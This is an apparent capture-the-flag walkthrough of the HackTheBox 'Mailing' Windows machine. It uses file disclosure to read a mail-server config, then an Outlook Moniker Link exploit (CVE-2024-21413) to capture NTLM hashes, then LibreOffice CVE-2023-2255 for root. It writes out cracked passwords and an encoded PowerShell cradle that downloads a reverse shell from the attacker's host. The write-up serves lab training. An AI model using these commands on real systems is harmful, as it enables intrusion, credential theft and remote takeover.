2024
### NMAP

```
sudo nmap -sC -vv -sV -oN nmap-mailing 10.10.11.14
```
### Enumerate for Initial Access

Discovering File Disclosure in the download script on the web app using Burp

#### File Disclosure 

Requesting file that doesn't exist and getting "File not found"
![[HackTheBox/Windows/attachments/Pasted image 20250524211801.png]]

Now going up one directory and discovery a script (the file disclosure vuln)

![[HackTheBox/Windows/attachments/Pasted image 20250524211914.png]]

Try to read the `windows/system32/license.rft` file bc this file always exists 
![[HackTheBox/Windows/attachments/Pasted image 20250524212100.png]]

#### try to read hmail server config file

This file is located in `Program Files (x86)\hMailServer\Bin\hMailServer`

![[HackTheBox/Windows/attachments/Pasted image 20250524212438.png]]
- can see "AdministratorPassword" and MSSQL password

#### Crack these MD5 hashes

Can use [crackstation](https://crackstation.net/)

The administrator password did crack to be `homenetworkingadministrator`

These creds do work with SMTP, but cannot phish our way in here. 

```
swaks -server mailing.htb --auth LOGIN --auth-user administrator@mailing.htb --auth-password homenetworkingadministrator --quit-after AUTH
```

Look for additional windows mail exploits..
### Initial Access

#### Moniker Link (CVE-2024-21413) vulnerability

[GitHub PoC and Exploit ](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

Download this PoC 
```
git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
```

Exploit with arguments
```
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.8\test\meeting" --subject test
```

![[HackTheBox/Windows/attachments/Pasted image 20250524214058.png]]

#### Set Up Responder to Catch NTLM Hash
Set this up before executing the exploit code
```
sudo responder -I tun0
```

We got maya's NTLMv2 hash
![[HackTheBox/Windows/attachments/Pasted image 20250524214146.png]]

Copy and paste this hash into a file to crack using john wordlist. 

The hash cracked to be `m4y4ngs4ri`

Try to read her shares.

#### Use nxc to discover an Important Docs share 

```
nxc smb 10.10.11.14 -u maya -p m4y4ngs4ri --shares
```
![[HackTheBox/Windows/attachments/Pasted image 20250524214625.png]]

Read this share with smb client 
#### SMBClient 
Use SMBClient to read shares 
```
smbclient -U maya //10.10.11.14/Important\ Documents
```
- there were no files

#### WINRM
Try nxc with winrm and we get pwn3d!
```
nxc winrm 10.10.11.14 -u maya -p m4y4ngs4ri
```

#### EVIL-WINRM to Login

```
evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
```
### Enumerate for Priv Esc 

Trying to read hidden files using 

```
gci -force
```

![[HackTheBox/Windows/attachments/Pasted image 20250524215805.png]]

Checking to see which programs are installed..

![[HackTheBox/Windows/attachments/Pasted image 20250524220031.png]]

Notice LibreOffice is Installed.

Search for LibreOffice version in this directory `version.ini`

![[HackTheBox/Windows/attachments/Pasted image 20250524220202.png]]
- version is 7.4.0.1

Search google for openoffice 7.4.0.1 exploit and find [CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255)
### Priv Esc

#### CVE-2023-2255

Clone this repo 
```
git clone https://github.com/elweth-sec/CVE-2023-2255.git
```


#### Encoded PowerShell Cradle

Create this encoded cradle to insert into exploit code to get a reverse shell

Save as 'cradle'
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/shell.ps1')
```

Encode this cradle
```bash
cat cradle | iconv -t utf-16le| base64 -w 0
```

![[HackTheBox/Windows/attachments/Pasted image 20250524221043.png]]

Now create the "shell.ps1" for this cradle to grab using Nishang's 
`Invoke-PowerShellTcpOneLine.ps1`
![[HackTheBox/Windows/attachments/Pasted image 20250524221243.png]]

Add kali ip and port
![[HackTheBox/Windows/attachments/Pasted image 20250524221349.png]]

Set up python server to serve up shell.ps1

Set up nc listener

Copy and paste this encoded cradle into exploit 
```
python3 CVE-2023-2255.py --cmd 'cmd /c powershell -enc '<ENCODED CRADLE>' --output exploit.odt
```
![[HackTheBox/Windows/attachments/Pasted image 20250524221837.png]]
#### Get reverse shell 

Return to evil-winrm shell and curl the exploit.odt file

![[HackTheBox/Windows/attachments/Pasted image 20250524221713.png]]

Catch rev shell
![[HackTheBox/Windows/attachments/Pasted image 20250524221758.png]]

⭐got root⭐
